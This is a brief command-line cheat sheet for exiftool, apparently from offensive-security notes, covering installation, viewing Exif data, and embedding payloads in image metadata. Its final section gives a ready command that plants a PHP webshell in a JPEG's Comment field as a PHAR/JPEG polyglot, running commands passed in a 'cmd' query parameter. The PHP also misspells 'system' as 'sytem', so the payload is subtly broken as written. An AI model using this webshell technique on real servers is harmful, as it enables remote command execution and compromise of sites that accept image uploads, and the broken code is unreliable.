# [exiftool](https://exiftool.org/)

> Command-line tool for reading a file's Exif data.

---

## Installation

On Linux distributions that use Aptitude:

```bash
sudo apt install libimage-exiftool-perl
```

---

## View a File's Exif Data

```bash
exiftool $FILE_PATH
```

---

## Embed a Payload within an Image's Metadata

```bash
exiftool -Comment="$PAYLOAD;" img.jpg
```

Example PHAR/JPEG webshell polyglot:

```bash
exiftool -Comment="<?php echo 'OUTPUT-BEGIN:'; echo sytem($_GET['cmd']); echo ':OUTPUT-END'; __halt_compiler();" img.jpg
```
